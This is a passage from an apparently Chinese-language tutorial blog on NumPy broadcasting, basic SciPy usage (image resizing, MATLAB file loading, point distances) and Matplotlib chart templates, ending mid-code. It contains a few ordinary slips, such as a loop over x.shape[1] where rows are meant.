href="#0-1-5-Broadcasting" class="headerlink" title="0.1.5 Broadcasting"></a>0.1.5 Broadcasting</h3><p>广播（broadcasting）是 Numpy 运算中相当重要的性质之一，它为不同维度的 array 间的运算提供了更高效的方式。下面几种常用的手段：</p><h4 id="将-rank-1-array-加到-matrix-的每一行上"><a href="#将-rank-1-array-加到-matrix-的每一行上" class="headerlink" title="将 rank-1 array 加到 matrix 的每一行上"></a>将 rank-1 array 加到 matrix 的每一行上</h4><p>假设现在有个需求，将 <code>v</code> 向量加到 <code>x</code> 的每一行上，最后放到 <code>y</code> 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line">v = np.array([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># empty_like() 按照 x.shape 来创建一个空矩阵</span></span><br><span class="line">y = np.empty_like(x)</span><br></pre></td></tr></table></figure><p>如果不用 broadcasting 就应该这么做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">    y[i, :] = x[i, :] + v</span><br></pre></td></tr></table></figure><p>或者使用 <code>tile</code> 来堆叠重复向量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vv = np.tile(v, (<span class="number">4</span>, <span class="number">1</span>))   <span class="comment"># Stack 4 copies of v on top of each other</span></span><br><span class="line"><span class="built_in">print</span>(vv)                 <span class="comment"># Prints &quot;[[1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]]&quot;</span></span><br></pre></td></tr></table></figure><p>第一种方法虽然能实现需求，但是如果 <code>x</code> 相当大，那么 Python 自己的循环就非常慢，因此我们需要借助 broadcasting（写在 Numpy Library 中，C/C++ 实现）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不同维度的 array 通过 broadcast 直接运算</span></span><br><span class="line">y = x + v  <span class="comment"># Add v to each row of x using broadcasting</span></span><br></pre></td></tr></table></figure><p>但是如果使用不当会出现 shape mismatch 的情况。因此我们需要知道 broadcast 的算法：</p><ol><li><p>如果参与运算的 arrays 的 rank 不同，那么向 rank 小的 array 的 shape 中 <code>prepend</code> 数字 1（可以在不添加元素的前提下扩展维度），直至它们的 rank（就是 shape 元组的长度）相等；</p><blockquote><p>例如 <code>[1, 2, 3]</code>（shape <code>(3,)</code>）扩展一次维度后变成 <code>[[1, 2, 3]]</code>（shape <code>(1, 3)</code>）；</p></blockquote><p>定义：两个 arrays 在某个维度上 compatible（匹配），当且仅当它们的 shape 在这个维度上的值相同，<u>或者一方为 1</u>；</p><p>因此，第一步就是尝试让两个参与运算的 array 在每个维度上都匹配。数学上<strong>只有两个 array 在每个维度上都匹配，才能进行 broadcasting 操作</strong>。</p></li><li><p>两个 arrays 运算时，如果在某个维度上一方为 1，另一方大于 1，那么说明需要在这个维度上 broadcasting，具体做法就是让这个维度上为 1 的 array，在当前维度上重复多次直至与另一个 array 的相等；</p></li><li><p>如果两个 arrays 是匹配的，那么在最终运算结束时，结果是二者 shapes 的 element-wise 的最大值。</p></li></ol><p><strong>思考 1：为什么 broadcasting 会将向量加到矩阵的每一行，而不是每一列？</strong></p><p>答：由 broadcasting 算法决定。上面提到，会向 shape 中 <code>prepend</code> 数字 1，这就是原因（如果算法是 append 的话就是加到列上去了）。</p><p><strong>思考 2：那么我们如何利用 broadcasting 将向量加到每一列上？</strong></p><p>答：先用转置，然后最后再转置回去就行。或者使用 <code>reshape</code> 来手动预处理 shape（向它 append 1）；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">w = np.array([<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>((x.T + w).T)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">print</span>(x + np.reshape(w, (<span class="number">2</span>, <span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h4 id="常量-Element-wise-运算"><a href="#常量-Element-wise-运算" class="headerlink" title="常量 Element-wise 运算"></a>常量 Element-wise 运算</h4><p>这应该是广播最为通俗易懂的形式。</p><p>我们直接用常量（相当于扩展前的 shape <code>(1,)</code>）向矩阵乘：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="built_in">print</span>(x * <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="计算向量叉积"><a href="#计算向量叉积" class="headerlink" title="计算向量叉积"></a>计算向量叉积</h4><blockquote><p>注：可以使用自带方法 <code>numpy.outer(a, b)</code>，这里只是展示如何用 broadcasting 完成叉积（外积）。</p></blockquote><p>本质上就是将被乘向量的每个元素乘到每个列上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">w = np.array([<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.reshape(v, (<span class="number">3</span>, <span class="number">1</span>)) * w)</span><br></pre></td></tr></table></figure><p>关于 Numpy 的基础用法掌握这么多就够了。如果希望更多的信息，请参见 Numpy 官方文档。</p><h2 id="0-2-SciPy"><a href="#0-2-SciPy" class="headerlink" title="0.2 SciPy"></a>0.2 SciPy</h2><p><code>SciPy</code> 库提供了一些高性能方法来计算和掌控多维数组，对科学计算和工程有很大用处。</p><p>最好入门的方法是阅读这个文档：<a href="https://docs.scipy.org/doc/scipy/reference/index.html">Scipy - Reference</a>。这里我们尽快入门为主，有需要再自行翻阅。</p><h3 id="0-2-1-Image-Operations"><a href="#0-2-1-Image-Operations" class="headerlink" title="0.2.1 Image Operations"></a>0.2.1 Image Operations</h3><p>Scipy 库提供了图像处理的基本函数。例如：</p><ul><li>从磁盘的图片中读入到 Numpy 数组；</li><li>将 Numpy 数组写成图片；</li></ul><p>下面是使用 Scipy resize 图片的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注：这个写法在 scipy 1.2.0 以后被弃用。</span></span><br><span class="line"><span class="comment"># 你应该使用 opencv 来导入图片</span></span><br><span class="line"><span class="comment"># from cv2 import imread, resize, imwrite</span></span><br><span class="line"><span class="keyword">from</span> scipy.misc <span class="keyword">import</span> imread, imsave, imresize</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read an JPEG image into a numpy array</span></span><br><span class="line">img = imread(<span class="string">&#x27;assets/cat.jpg&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(img.dtype, img.shape)  <span class="comment"># Prints &quot;uint8 (400, 248, 3)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 补充计算机图形学知识：从这里能看出，jpg 格式的位深度为 8x3 = 24（bytes）</span></span><br><span class="line"><span class="comment"># 其中每个值是 uint8 存储，共 3 个通道（RGB）</span></span><br><span class="line"><span class="comment"># 如果是 png 格式，可以是 4 个通道（RGBA），可以存透明度，称为 PNG-32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Broadcasting</span></span><br><span class="line"><span class="comment"># 将图像的 Green Channel 和 Blue Channel 像素值分别广播乘以 0.95 和 0.9</span></span><br><span class="line"><span class="comment"># 图像会微微泛红</span></span><br><span class="line">img_tinted = img * [<span class="number">1</span>, <span class="number">0.95</span>, <span class="number">0.9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resize</span></span><br><span class="line">img_tinted = imresize(img_tinted, (<span class="number">300</span>, <span class="number">300</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save</span></span><br><span class="line">imsave(<span class="string">&#x27;assets/cat_tinted.jpg&#x27;</span>, img_tinted)</span><br></pre></td></tr></table></figure><h3 id="0-2-2-Matlab-Files"><a href="#0-2-2-Matlab-Files" class="headerlink" title="0.2.2 Matlab Files"></a>0.2.2 Matlab Files</h3><p>我们可以从 Matlab 中加载通用的矩阵文件。例如下面的例子是从 Matlab 的矩阵文件中加载复数矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load matlab mat file</span></span><br><span class="line">trainDataRaw = loadmat(<span class="string">&quot;data/PA_data_train.mat&quot;</span>)</span><br><span class="line">testDataRaw = loadmat(<span class="string">&quot;data/PA_data_test.mat&quot;</span>)</span><br><span class="line">train_input = trainDataRaw[<span class="string">&#x27;paInput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">train_output = trainDataRaw[<span class="string">&#x27;paOutput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(train_input) == <span class="built_in">len</span>(train_output), <span class="string">&quot;The size of input vector should be equal to the output one.&quot;</span></span><br><span class="line"></span><br><span class="line">test_input = testDataRaw[<span class="string">&#x27;paInput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">test_output = testDataRaw[<span class="string">&#x27;paOutput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(test_input) == <span class="built_in">len</span>(test_output), <span class="string">&quot;The size of input vector should be equal to the output one.&quot;</span></span><br><span class="line"></span><br><span class="line">trainData = [(<span class="built_in">complex</span>(train_input[k]), <span class="built_in">complex</span>(train_output[k])) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(train_input))]</span><br><span class="line">testData = [(<span class="built_in">complex</span>(test_input[k]), <span class="built_in">complex</span>(test_output[k])) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_input))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[INFO] Train data loaded: <span class="subst">&#123;<span class="built_in">len</span>(trainData)&#125;</span> groups (input, output)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[INFO] Test data loaded: <span class="subst">&#123;<span class="built_in">len</span>(testData)&#125;</span> groups (input, output)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Preparing for the module of the data</span></span><br><span class="line">trainModule = [(<span class="built_in">abs</span>(i[<span class="number">0</span>]), <span class="built_in">abs</span>(i[<span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> trainData]</span><br><span class="line">testModule = [(<span class="built_in">abs</span>(i[<span class="number">0</span>]), <span class="built_in">abs</span>(i[<span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> testData]</span><br></pre></td></tr></table></figure><h3 id="0-2-3-Distance-between-points"><a href="#0-2-3-Distance-between-points" class="headerlink" title="0.2.3 Distance between points"></a>0.2.3 Distance between points</h3><p>Scipy 求两点间距如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.spatial.distance <span class="keyword">import</span> pdist, cdist, squareform</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一组二维点</span></span><br><span class="line">x = np.array([</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">0</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算点集中两两间的欧几里得距离，输出为矩阵</span></span><br><span class="line"><span class="comment"># 第 i 行、第 j 列表示点集中第 i 个点和第 j 个点的欧式距离</span></span><br><span class="line"><span class="comment"># [[ 0.          1.41421356  2.23606798]</span></span><br><span class="line"><span class="comment">#  [ 1.41421356  0.          1.        ]</span></span><br><span class="line"><span class="comment">#  [ 2.23606798  1.          0.        ]]</span></span><br><span class="line">d = squareform(pdist(x, <span class="string">&#x27;euclidean&#x27;</span>))</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">e = cdist(x, x, <span class="string">&#x27;euclidean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>还有一个 <code>cdist</code> 求的是两个点集间的距离（指定两个点集，而不像上面是在一个点集内），自动输出为矩阵形式。</p><h2 id="0-3-Matplotlib"><a href="#0-3-Matplotlib" class="headerlink" title="0.3 Matplotlib"></a>0.3 Matplotlib</h2><p>介绍一些模板用法。</p><h3 id="0-3-1-并列折线图"><a href="#0-3-1-并列折线图" class="headerlink" title="0.3.1 并列折线图"></a>0.3.1 并列折线图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line"></span><br><span class="line">prim = [<span class="number">27138166.8</span>, <span class="number">9152368.0</span>, <span class="number">7887584.4</span>, <span class="number">5203370.6</span>]</span><br><span class="line">opt = [<span class="number">45508900.4</span>, <span class="number">91379932.6</span>, <span class="number">179513808.6</span>, <span class="number">289122555.6</span>]</span><br><span class="line"></span><br><span class="line">axe.scatter(x, prim, c=<span class="string">&#x27;#219ebc&#x27;</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axe.scatter(x, opt, c=<span class="string">&#x27;#feb705&#x27;</span>, marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"><span class="comment"># axe.scatter(x, ratio_3, c=&#x27;#fa8600&#x27;, marker=&#x27;^&#x27;)</span></span><br><span class="line">axe.plot(x, prim, <span class="string">&#x27;-&#x27;</span>, c=<span class="string">&#x27;#219ebc&#x27;</span>, label=<span class="string">&quot;Primitive&quot;</span>)</span><br><span class="line">axe.plot(x, opt, <span class="string">&#x27;-&#x27;</span>, c=<span class="string">&#x27;#feb705&#x27;</span>, label=<span class="string">&quot;Optimized&quot;</span>)</span><br><span class="line"><span class="comment"># axe.plot(x, ratio_3, &#x27;-&#x27;, c=&#x27;#fa8600&#x27;, label=&quot;Workload 3&quot;)</span></span><br><span class="line"></span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.legend()</span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line"></span><br><span class="line"><span class="comment"># axe.set_ylim([0.3, 1.2])</span></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;Thread Number&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Average Throughput (ops/s)&#x27;</span>)</span><br><span class="line">axe.set_title(<span class="string">&#x27;Average Throughput - Thread Number Relationship Plot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axe.ticklabel_format(style=<span class="string">&#x27;sci&#x27;</span>, scilimits=(-<span class="number">1</span>, <span class="number">2</span>), axis=<span class="string">&#x27;y&#x27;</span>, useMathText=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/throughput.png" width="400px" /></p><h3 id="0-3-2-并列直方图"><a href="#0-3-2-并列直方图" class="headerlink" title="0.3.2 并列直方图"></a>0.3.2 并列直方图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">labels = [<span class="string">&#x27;Tiny&#x27;</span>, <span class="string">&#x27;Small&#x27;</span>, <span class="string">&#x27;Medium&#x27;</span>, <span class="string">&#x27;Large&#x27;</span>]</span><br><span class="line">x_labels = labels</span><br><span class="line">width = <span class="number">0.2</span></span><br><span class="line">x = np.arange(<span class="built_in">len</span>(labels))</span><br><span class="line"></span><br><span class="line">qs = [<span class="number">5458</span>, <span class="number">36660</span>, <span class="number">155667</span>, <span class="number">1341294</span>]</span><br><span class="line">ls = [<span class="number">27247</span>, <span class="number">287699</span>, <span class="number">1146510</span>, <span class="number">10195125</span>]</span><br><span class="line">qs_r = [<span class="number">6469</span>, <span class="number">45830</span>, <span class="number">192725</span>, <span class="number">2354645</span>]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line"></span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line"></span><br><span class="line">axe.bar(x - width - <span class="number">0.05</span>, qs, width, color=<span class="string">&#x27;#2a9d8c&#x27;</span>, label=<span class="string">&#x27;Quick Select&#x27;</span>, zorder=<span class="number">10</span>,</span><br><span class="line">        edgecolor=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">1</span>)</span><br><span class="line">axe.bar(x, ls, width, label=<span class="string">&#x27;Linear Select ($Q=5$)&#x27;</span>, color=<span class="string">&#x27;#e9c46b&#x27;</span>, zorder=<span class="number">10</span>,</span><br><span class="line">        edgecolor=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">1</span>)</span><br><span class="line">axe.bar(x + width + <span class="number">0.05</span>, qs_r, width, color=<span class="string">&#x27;#e66f51&#x27;</span>, label=<span class="string">&#x27;Quick Select (random pivot)&#x27;</span>, zorder=<span class="number">10</span>,</span><br><span class="line">        edgecolor=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;Data Scale&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Operation Latency (ns)&#x27;</span>)</span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line"></span><br><span class="line">axe.set_yscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">axe.legend()</span><br><span class="line"></span><br><span class="line">axe.set_title(<span class="string">&#x27;Operation Latency for Unordered Data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/1-2.png" width="400px" /></p><h3 id="0-3-3-堆叠条形图"><a href="#0-3-3-堆叠条形图" class="headerlink" title="0.3.3 堆叠条形图"></a>0.3.3 堆叠条形图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">labels = [<span class="string">&#x27;Short (80 B)&#x27;</span>, <span class="string">&#x27;Middle (7.5 KB)&#x27;</span>, <span class="string">&#x27;Large (740 KB)&#x27;</span>]</span><br><span class="line">x_labels = labels</span><br><span class="line">width = <span class="number">0.2</span></span><br><span class="line">x = np.arange(<span class="built_in">len</span>(labels))</span><br><span class="line"></span><br><span class="line">uncompressed = [<span class="number">80</span>, <span class="number">7500</span>, <span class="number">740_000</span>]</span><br><span class="line">uncompressed_ratio = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">single = [<span class="number">50</span>, <span class="number">4000</span>, <span class="number">392_000</span>]</span><br><span class="line">single_dict = [<span class="number">185</span>, <span class="number">477</span>, <span class="number">508</span>]</span><br><span class="line">single_ratio = [single[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line">single_dict_ratio = [single_dict[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">multi = [<span class="number">48</span>, <span class="number">3900</span>, <span class="number">383_000</span>]</span><br><span class="line">multi_dict = [<span class="number">212</span>, <span class="number">504</span>, <span class="number">528</span>]</span><br><span class="line">multi_ratio = [multi[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line">multi_dict_ratio = [multi_dict[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line"></span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line"></span><br><span class="line">axe.bar(x - width - <span class="number">0.05</span>, uncompressed_ratio, width, color=<span class="string">&#x27;gray&#x27;</span>,label=<span class="string">&#x27;Uncompressed&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line">axe.bar(x, single_ratio, width, label=<span class="string">&#x27;Single&#x27;</span>, color=<span class="string">&#x27;#56baf8&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line">axe.bar(x + width + <span class="number">0.05</span>, multi_ratio, width, color=<span class="string">&#x27;#f8566a&#x27;</span>, label=<span class="string">&#x27;Multiple&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">axe.bar(x, single_dict_ratio, width, bottom=single_ratio, color=<span class="string">&#x27;#9fd8fb&#x27;</span>, label=<span class="string">&#x27;Single Dict&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line">axe.bar(x + width + <span class="number">0.05</span>, multi_dict_ratio, width, color=<span class="string">&#x27;#fb9fab&#x27;</span>, bottom=multi_ratio, label=<span class="string">&#x27;Multiple Dict&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;File Type&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Compress Ratio&#x27;</span>)</span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line">axe.legend()</span><br><span class="line"></span><br><span class="line">axe.set_title(<span class="string">&#x27;The Compressed Ratio Comparison&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/comp2.png" width="400px" /></p><h3 id="0-3-4-折线-直方组合图-amp-对数坐标"><a href="#0-3-4-折线-直方组合图-amp-对数坐标" class="headerlink" title="0.3.4 折线-直方组合图 &amp; 对数坐标"></a>0.3.4 折线-直方组合图 &amp; 对数坐标</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">labels = [<span class="string">&#x27;Short (80 B)&#x27;</span>, <span class="string">&#x27;Middle (7.5 KB)&#x27;</span>, <span class="string">&#x27;Large (740 KB)&#x27;</span>]</span><br><span class="line">x_labels = labels</span><br><span class="line">width = <span class="number">0.2</span></span><br><span class="line">x = np.arange(<span class="built_in">len</span>(labels))</span><br><span class="line"></span><br><span class="line">uncompressed = [<span class="number">80</span>, <span class="number">7500</span>, <span class="number">740_000</span>]</span><br><span class="line"></span><br><span class="line">single = [<span 